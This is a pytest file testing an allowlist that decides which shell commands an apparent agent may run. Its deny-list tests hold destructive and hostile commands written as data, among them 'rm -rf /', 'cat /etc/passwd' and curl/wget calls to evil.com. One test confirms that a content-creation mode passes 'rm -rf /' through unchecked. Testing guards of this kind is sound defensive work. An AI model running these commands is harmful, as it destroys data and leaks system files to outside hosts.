import pytest
import os
import sys
import shutil

# Import the modules to test.
sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'dags'))
import frankenagent_8_0_kesselflow
import frankenagent_8_1_kesselflow
import frankenagent_kesselflow

modules_to_test = [
    frankenagent_8_0_kesselflow,
    frankenagent_8_1_kesselflow,
    frankenagent_kesselflow
]

@pytest.mark.parametrize("module", modules_to_test)
def test_obey_rayrock_decree_allowed(module):
    # Valid allowed commands
    for cmd in ["ls", "echo hello", "git status", "pytest tests/", "python3 script.py"]:
        allowed, msg, tokens = module.obey_rayrock_decree("command", cmd)
        # Handle cases where `pytest` or others might not be in PATH in test env
        executable = cmd.split()[0]
        if shutil.which(executable):
            assert allowed is True
            assert msg is None
            assert tokens is not None
            assert tokens[0] == shutil.which(executable)
        else:
            assert allowed is False
            assert "not found in PATH" in msg

@pytest.mark.parametrize("module", modules_to_test)
def test_obey_rayrock_decree_denied(module):
    # Invalid or unknown commands
    for cmd in ["rm -rf /", "sudo bash", "cat /etc/passwd", "curl http://evil.com", "wget http://evil.com"]:
        allowed, msg, tokens = module.obey_rayrock_decree("command", cmd)
        assert allowed is False
        assert "unauthorized by decree" in msg

@pytest.mark.parametrize("module", modules_to_test)
def test_obey_rayrock_decree_python_flags(module):
    # Python with malicious flags
    for cmd in ["python3 -c 'import os; os.system(\"ls\")'", "python3 -m http.server"]:
        allowed, msg, tokens = module.obey_rayrock_decree("command", cmd)
        assert allowed is False
        if shutil.which("python3"):
            assert "Arbitrary execution flags" in msg
        else:
            assert "not found in PATH" in msg

@pytest.mark.parametrize("module", modules_to_test)
def test_obey_rayrock_decree_empty(module):
    for cmd in ["", "   ", "\n"]:
        allowed, msg, tokens = module.obey_rayrock_decree("command", cmd)
        assert allowed is False
        assert "Empty command payload rejected" in msg

@pytest.mark.parametrize("module", modules_to_test)
def test_obey_rayrock_decree_task_type(module):
    # Content creation bypasses the check but still works properly
    allowed, msg, tokens = module.obey_rayrock_decree("content_creation", "rm -rf /")
    assert allowed is True
    assert tokens == "rm -rf /"

@pytest.mark.parametrize("module", modules_to_test)
def test_obey_rayrock_decree_path_traversal(module):
    # Path traversal / wrappers are blocked
    for cmd in ["./git status", "/bin/ls", "/tmp/malicious/python3 script.py", "../echo hi"]:
        allowed, msg, tokens = module.obey_rayrock_decree("command", cmd)
        assert allowed is False
        assert "Directory separators are not allowed" in msg

@pytest.mark.parametrize("module", modules_to_test)
def test_obey_rayrock_decree_not_in_path(module):
    # What if a command is in the decree but not installed? (assuming 'fictitious_cmd' isn't in allowlist anyway)
    # Let's temporarily add a fake allowed command and test it
    original_allowed = module.ALLOWED_COMMANDS.copy()
    module.ALLOWED_COMMANDS.add("fake_missing_cmd")

    allowed, msg, tokens = module.obey_rayrock_decree("command", "fake_missing_cmd")
    assert allowed is False
    assert "not found in PATH" in msg

    # Restore
    module.ALLOWED_COMMANDS = original_allowed
